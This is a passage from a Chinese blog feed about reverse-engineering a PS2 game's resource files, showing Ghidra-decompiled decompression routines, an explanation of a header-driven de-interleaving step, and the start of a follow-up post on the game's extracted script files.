class="built_in">queue</span>[<span class="number">1</span>];</span><br><span class="line">      piVar2 = <span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">      length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>)) &#123;</span><br><span class="line">        length = (<span class="type">long</span>)(<span class="type">int</span>)end;</span><br><span class="line">      &#125;</span><br><span class="line">      *piVar3 = *piVar6;</span><br><span class="line">      *piVar6 = *piVar4;</span><br><span class="line">      *piVar4 = *piVar5;</span><br><span class="line">      *piVar5 = *piVar2;</span><br><span class="line">      *piVar2 = (<span class="type">int</span>)data;</span><br><span class="line">      instruction = data[<span class="number">1</span>];</span><br><span class="line">      data = data + <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> (pos &lt; length) &#123;</span><br><span class="line">        *pbVar9 = instruction;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span> ) &#123;</span><br><span class="line">          pbVar9 = (byte *)((<span class="type">int</span>)pos + <span class="number">1</span>);</span><br><span class="line">          pos = (ulong)(<span class="type">int</span>)pbVar9;</span><br><span class="line">          <span class="keyword">if</span> (length &lt;= pos) <span class="keyword">break</span>;</span><br><span class="line">          *pbVar9 = instruction;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LAB_00116120:</span><br><span class="line">      length = pos - uVar8;</span><br><span class="line">      <span class="keyword">if</span> (uVar7 &lt; pos) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* command == 7 */</span></span><br><span class="line">      command = (uint)(instruction &gt;&gt; <span class="number">5</span>);</span><br><span class="line">      <span class="keyword">if</span> ((instruction &amp; <span class="number">0xe0</span>) == <span class="number">0xe0</span>) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">5</span>] = *<span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">        piVar2 = <span class="built_in">queue</span>[<span class="number">2</span>];</span><br><span class="line">        piVar4 = <span class="built_in">queue</span>[<span class="number">1</span>];</span><br><span class="line">        length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>));</span><br><span class="line">        <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>))) &#123;</span><br><span class="line">          length = uVar7;</span><br><span class="line">        &#125;</span><br><span class="line">        *piVar3 = *piVar6;</span><br><span class="line">        piVar3 = <span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">        *piVar6 = *piVar2;</span><br><span class="line">        *piVar2 = *piVar4;</span><br><span class="line">        *piVar4 = *piVar3;</span><br><span class="line">        *piVar3 = (<span class="type">int</span>)data;</span><br><span class="line">        <span class="keyword">for</span> (; data = data + <span class="number">1</span>, pos &lt;= length; pos = (ulong)(<span class="type">int</span>)((byte *)pos + <span class="number">1</span>)) &#123;</span><br><span class="line">          *(byte *)pos = *data;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LAB_00116120;</span><br><span class="line">      &#125;</span><br><span class="line">      ref_0 = (byte *)(&amp;DAT_00261390)[command];</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">4</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">5</span>] = *<span class="built_in">queue</span>[<span class="number">4</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">3</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">4</span>] = *<span class="built_in">queue</span>[<span class="number">3</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">2</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">3</span>] = *<span class="built_in">queue</span>[<span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">1</span> &lt; command) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">2</span>] = *<span class="built_in">queue</span>[<span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      piVar4 = <span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> (command != <span class="number">0</span>) &#123;</span><br><span class="line">        *<span class="built_in">queue</span>[<span class="number">1</span>] = *<span class="built_in">queue</span>[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">      *piVar4 = (<span class="type">int</span>)ref_0;</span><br><span class="line">                    <span class="comment">/* dp == 6 */</span></span><br><span class="line">      <span class="keyword">if</span> ((*ref_0 &amp; <span class="number">0xe0</span>) == <span class="number">0xc0</span>) &#123;</span><br><span class="line">        length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">0x1f</span>) + <span class="number">2</span>)) &#123;</span><br><span class="line">          length = (<span class="type">long</span>)(<span class="type">int</span>)end;</span><br><span class="line">        &#125;</span><br><span class="line">        instruction = ref_0[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (pos &lt; length) &#123;</span><br><span class="line">          *pbVar9 = instruction;</span><br><span class="line">          <span class="keyword">while</span>(<span class="literal">true</span> ) &#123;</span><br><span class="line">            pbVar9 = (byte *)((<span class="type">int</span>)pos + <span class="number">1</span>);</span><br><span class="line">            pos = (ulong)(<span class="type">int</span>)pbVar9;</span><br><span class="line">            <span class="keyword">if</span> (length &lt;= pos) <span class="keyword">break</span>;</span><br><span class="line">            *pbVar9 = instruction;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bVar1 = uVar7 &lt; pos;</span><br><span class="line">LAB_001162d8:</span><br><span class="line">        <span class="keyword">if</span> (bVar1) &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">/* dp == 7 */</span></span><br><span class="line">        <span class="keyword">if</span> ((*ref_0 &amp; <span class="number">0xe0</span>) == <span class="number">0xe0</span>) &#123;</span><br><span class="line">          ref_0 = ref_0 + <span class="number">1</span> + ((instruction &amp; <span class="number">0x1f</span>) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">          length = (<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">3</span>));</span><br><span class="line">          <span class="keyword">if</span> (uVar7 &lt; (ulong)(<span class="type">long</span>)(<span class="type">int</span>)(pbVar9 + (instruction &amp; <span class="number">3</span>))) &#123;</span><br><span class="line">            length = (<span class="type">long</span>)(<span class="type">int</span>)end;</span><br><span class="line">          &#125;</span><br><span class="line">          bVar1 = uVar7 &lt; pos;</span><br><span class="line">          <span class="keyword">if</span> (pos &lt;= length) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">              *(byte *)pos = *ref_0;</span><br><span class="line">              pos = (ulong)(<span class="type">int</span>)((byte *)pos + <span class="number">1</span>);</span><br><span class="line">              ref_0 = ref_0 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">while</span> (pos &lt;= length);</span><br><span class="line">            bVar1 = uVar7 &lt; pos;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LAB_001162d8;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      data = data + <span class="number">1</span>;</span><br><span class="line">      length = pos - uVar8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= length) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    instruction = *data;</span><br><span class="line">  &#125; <span class="keyword">while</span>(<span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然老哥没逆错，这个函数的内容和老哥逆出来的一样，从 <code>data</code> 中解压数据到 <code>dst</code> 中，<code>queue</code> 就是老哥的 <code>HISTORY</code>，表达式 <code>(xxx &amp; 0xe0) == 0xc0</code> 等价于 <code>xxx == 6</code>，<code>(xxx &amp; 0xe0) == 0xe0</code> 等价于 <code>xxx == 7</code>。</p><p>发现这个函数中也没有使用前面提到的文件中第 5~8 个字节（为了表达方便，我们记为 <code>unknown</code>），只用了前 4 个字节 <code>size</code>，那么就回到这个函数的调用者，看看调用者在执行完这个函数后会不会对 <code>dst</code> 做其他处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ulong <span class="title function_">decompress_chunk</span><span class="params">(byte *chunk,byte *result,<span class="type">long</span> param_3,<span class="type">long</span> param_4,<span class="type">long</span> param_5,</span></span><br><span class="line"><span class="params">                      undefined8 param_6)</span></span><br><span class="line">&#123;</span><br><span class="line">  byte *dst;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  ulong uVar2;</span><br><span class="line">  <span class="type">long</span> unknown;</span><br><span class="line">  <span class="type">long</span> lVar4;</span><br><span class="line">  ulong decompressed_size;</span><br><span class="line">  <span class="type">int</span> decompressed_size_1;</span><br><span class="line">  <span class="type">int</span> *buf [<span class="number">4</span>];</span><br><span class="line">  <span class="type">long</span> lVar3;</span><br><span class="line">  byte c4;</span><br><span class="line">  byte c5;</span><br><span class="line">  byte c6;</span><br><span class="line">  byte c7;</span><br><span class="line">  </span><br><span class="line">  lVar1 = (<span class="type">long</span>)(<span class="type">int</span>)result;</span><br><span class="line">  reset();</span><br><span class="line">  decompressed_size_1 = (uint)*chunk + (uint)chunk[<span class="number">3</span>] * <span class="number">0x1000000</span>;</span><br><span class="line">  lVar3 = (<span class="type">long</span>)decompressed_size_1;</span><br><span class="line">  c7 = chunk[<span class="number">7</span>];</span><br><span class="line">  c6 = chunk[<span class="number">6</span>];</span><br><span class="line">  decompressed_size_1 = decompressed_size_1 + (uint)chunk[<span class="number">2</span>] * <span class="number">0x10000</span> + (uint)chunk[<span class="number">1</span>] * <span class="number">0x100</span>;</span><br><span class="line">  c5 = chunk[<span class="number">5</span>];</span><br><span class="line">  lVar4 = (<span class="type">long</span>)(<span class="type">int</span>)((uint)c7 * <span class="number">0x1000000</span>);</span><br><span class="line">  c4 = chunk[<span class="number">4</span>];</span><br><span class="line">  decompressed_size = (ulong)decompressed_size_1;</span><br><span class="line">  <span class="built_in">malloc</span>((<span class="type">int</span> *)buf,decompressed_size);</span><br><span class="line">                    <span class="comment">/* try &#123; // try from 00116474 to 0011647b has its CatchHandler @ 001164dc */</span></span><br><span class="line">  dst = (byte *)extend_size(buf,<span class="number">0</span>);</span><br><span class="line">  decompress(chunk + <span class="number">8</span>,dst,<span class="number">1</span>,(<span class="type">long</span>)decompressed_size_1);</span><br><span class="line">  unknown = (<span class="type">long</span>)(<span class="type">int</span>)((uint)c4 + (uint)c7 * <span class="number">0x1000000</span> + (uint)c6 * <span class="number">0x10000</span> + (uint)c5 * <span class="number">0x100</span>);</span><br><span class="line">  uVar2 = decompressed_size;</span><br><span class="line">  FUN_00116348(dst,result,decompressed_size_1,unknown);</span><br><span class="line">  free_buf((<span class="type">int</span> *)buf,lVar1,uVar2,unknown,param_5,param_6,lVar3,lVar4);</span><br><span class="line">  <span class="keyword">return</span> decompressed_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>chunk</code> 就是一个文件的内容，dst 是 <code>decompress</code> 解压的输出，可以看到第 33 行执行完 <code>decompress</code> 后，取出 <code>chunk</code> 的第 5～8 个字节小端转换为 int 作为 <code>unknown</code>，最终带着 <code>dst</code>、为压缩文件大小 <code>decompress_size</code> 和 <code>unknown</code> 调用了 <code>FUN_00116348</code> 函数，并且结果放在 <code>result</code> 中，作为 <code>decompress_chunk</code> 函数的返回结果。</p><p>那么很明显，<code>FUN_00116348</code> 就是那个老哥没有逆干净的代码，进去看看这个函数用 <code>unknown</code> 干了啥。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">FUN_00116348</span><span class="params">(byte *buf,byte *result,<span class="type">int</span> size,<span class="type">long</span> unknown)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> k;</span><br><span class="line">  byte *pos;</span><br><span class="line">  <span class="type">int</span> j;</span><br><span class="line">  </span><br><span class="line">  j = size / (<span class="type">int</span>)unknown;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (unknown == <span class="number">0</span>) &#123;</span><br><span class="line">    trap(<span class="number">7</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  k = j * (<span class="type">int</span>)unknown;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> &lt; j) &#123;</span><br><span class="line">    pos = buf;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span> ) &#123;</span><br><span class="line">      <span class="keyword">for</span> (; pos &lt; buf + k; pos = pos + j) &#123;</span><br><span class="line">        *result = *pos;</span><br><span class="line">        result = result + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      i = i + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> (j &lt;= i) <span class="keyword">break</span>;</span><br><span class="line">      pos = buf + i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (; k &lt; size; k = k + <span class="number">1</span>) &#123;</span><br><span class="line">    *result = buf[k];</span><br><span class="line">    result = result + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>果然，我们前面的推理没错，<code>unknown</code> 确实作为一个常量参与解压计算，<code>FUN_00116348</code> 会基于 <code>unknown</code> 对 <code>decompress</code> 的结果进行新一轮解压，当 <code>unknown</code> 取值为 1 时，这个函数原封不动的复制 <code>buf</code> 到 <code>result</code> 中，这就是为什么老哥逆出来的解压算法只能成功解压 <code>unknown</code> 为 1 的文件。</p><p>最终，基于 <code>FUN_00116348</code> 的逆向结果，重新解压 <code>NORMAL</code> 的第 10 个文件 <code>SCENE_ID.LST</code>，这次解压出了正确的结果。</p><p><img src="/2024/02/10/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E5%9B%9B%EF%BC%89/6.jpg" alt="Not Found"></p>]]></content>
    
    
    <summary type="html">一个Web狗针对某上古时期的PlayStation2游戏的逆向以及资源提取记录。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="ReverseEngineering" scheme="https://srpopty.github.io/tags/ReverseEngineering/"/>
    
  </entry>
  
  <entry>
    <title>某上古 PS2 游戏逆向（三）游戏脚本初步分析与反编译</title>
    <link href="https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://srpopty.github.io/2023/06/12/%E6%9F%90%E4%B8%8A%E5%8F%A4PS2%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2023-06-12T05:02:36.000Z</published>
    <updated>2023-06-12T05:02:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="脚本代码分析"><a href="# 脚本代码分析" class="headerlink" title="脚本代码分析"></a>脚本代码分析 </h1><p> 接下来就是要提取出每个声音所对应的文本，当然文本也不是凭空冒出来的，一定在某个文件中保存着文本，并且需要靠程序逻辑判断哪个文本播放哪个音频。</p><p>游戏中主要在以下几个地方存在执行逻辑：主程序在 CD 根目录 <code>SLPS_258.97</code> 中，位于扩展库 <code>IOP</code> 目录下的各个 <code>.IRX</code> 中，这两个都是 32 位的 MIPS，就算用 Ghidra 反编译也不太好逆，此外在提取 <code>SYSTEM.BIN</code> 的时候发现里面存在某种脚本语言的代码，并且用 Shift-JIS 编码写日语注释，相较于二进制文件，先看一看从 <code>SYSTEM.BIN</code> 中提取的脚本都干了什么。利用前文中的提取脚本，提取出了以下几个文件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">/Users/xxxxx/Desktop/xxxxx/SYSTEM_extracted</span><br><span class="line">├── 0_0_131e.dat</span><br><span class="line">├── 10_1f000_0.dat</span><br><span class="line">├── 11_1f000_8c5.dat</span><br><span class="line">├── 12_20000_1a60.dat</span><br><span class="line">├── 13_22000_1f01.dat</span><br><span class="line">├── 14_24000_56d1.dat</span><br><span class="line">├── 15_29800_306.dat</span><br><span class="line">├── 16_2a000_111d.dat</span><br><span class="line">├── 17_2b800_2dc.dat</span><br><span class="line">├── 18_2c000_1296.dat</span><br><span class="line">├── 19_2d800_4083.dat</span><br><span class="line">├── 1_1800_15e4.dat</span><br><span class="line">├── 20_32000_b12.dat</span><br><span class="line">├── 21_33000_4faa.dat</span><br><span class="line">├── 22_38000_114f.dat</span><br><span class="line">├── 23_39800_650.dat</span><br><span class="line">├── 24_3a000_f02.dat</span><br><span class="line">├── 25_3b000_8f7.dat</span><br><span class="line">├── 26_3c000_126e.dat</span><br><span class="line">├── 27_3d800_56f6.dat</span><br><span class="line">├── 28_43000_d330.dat</span><br><span class="line">├── 29_50800_288a.dat</span><br><span class="line">├── 2_3000_6f4.dat</span><br><span class="line">├── 30_53800_60e4.dat</span><br><span class="line">├── 31_5a000_c69.dat</span><br><span class="line">├── 32_5b000_8688.dat</span><br><span class="line">├── 33_63800_9d29.dat</span><br><span class="line">├── 34_6d800_796.dat</span><br><span class="line">├── 35_6e000_2821.dat</span><br><span class="line">├── 36_71000_527f6.dat</span><br><span class="line">├── 37_c3800_11bf5.dat</span><br><span class="line">├── 38_d5800_72ed.dat</span><br><span class="line">├── 39_dd000_21d0.dat</span><br><span class="line">├── 3_3800_4e02.dat</span><br><span class="line">├── 40_df800_22b8.dat</span><br><span class="line">├── 41_e2000_36f.dat</span><br><span class="line">├── 4_8800_7736.dat</span><br><span class="line">├── 5_10000_416e.dat</span><br><span class="line">├── 6_14800_1540.dat</span><br><span class="line">├── 7_16000_50ce.dat</span><br><span class="line">├── 8_1b800_27ed.dat</span><br><span class="line">└── 9_1e000_946.dat</span><br><span class="line"></span><br><span class="line">1 directory, 42 files</span><br></pre></td></tr></table></figure><p>首先看看 <code>0_0_131e.dat</code> 中的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">// XXX 画面サイズ定義</span><br><span class="line">SCWIDTH  &lt;- 640;</span><br><span class="line">SCHEIGHT &lt;- 448;</span><br><span class="line"></span><br><span class="line">EMPTY &lt;- &#123;&#125;; // 空の辞書</span><br><span class="line"></span><br><span class="line">savef &lt;- null; // ゲーム変数セーブ処理用</span><br><span class="line">f     &lt;- &#123;&#125;; // ゲーム変数</span><br><span class="line">sf    &lt;- &#123;&#125;; // システム変数</span><br><span class="line">tf    &lt;- &#123;&#125;; // テンポラリ変数</span><br><span class="line"></span><br><span class="line">variables    &lt;- null; // 変数情報</span><br><span class="line">voiceConfigs &lt;- null; // ボイスコンフィグ情報</span><br><span class="line">vconfigs &lt;- null;</span><br><span class="line"></span><br><span class="line">VAR_GAME   &lt;- 0;</span><br><span class="line">VAR_SYSTEM &lt;- 1;</span><br><span class="line">VAR_TEMP   &lt;- 2;</span><br><span class="line">VAR_SYSTEMWORK &lt;- 3;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 変数の初期化</span><br><span class="line"> * @param variables 変数情報</span><br><span class="line"> * @param zone 0: ゲーム変数 1: システム変数 2: テンポラリ</span><br><span class="line"> */</span><br><span class="line">function initVariables(variables, zone)</span><br><span class="line">&#123;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            switch (info.zone) &#123;</span><br><span class="line">            case VAR_SYSTEM:</span><br><span class="line">                sf[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            case VAR_TEMP:</span><br><span class="line">                tf[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                f[info.name] &lt;- 0;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    savef = clone f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function storeVariables(variables, zone, ...)</span><br><span class="line">&#123;</span><br><span class="line">    local no = 0;</span><br><span class="line">    local store = null;</span><br><span class="line">    if (vargc &gt; 0) &#123;</span><br><span class="line">        no = vargv[0];</span><br><span class="line">        if (vargc &gt; 1) &#123;</span><br><span class="line">            store = vargv[1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    initFlag(zone, no);</span><br><span class="line">    if (zone == VAR_SYSTEMWORK) &#123;</span><br><span class="line">        zone = VAR_SYSTEM;</span><br><span class="line">    &#125;</span><br><span class="line">    for (local i=0;i&lt;variables.len();i++) &#123;</span><br><span class="line">        local info = variables[i];</span><br><span class="line">        if (info.zone == zone) &#123;</span><br><span class="line">            local var;</span><br><span class="line">            switch (zone) &#123;</span><br><span class="line">            case VAR_GAME:</span><br><span class="line">                var = 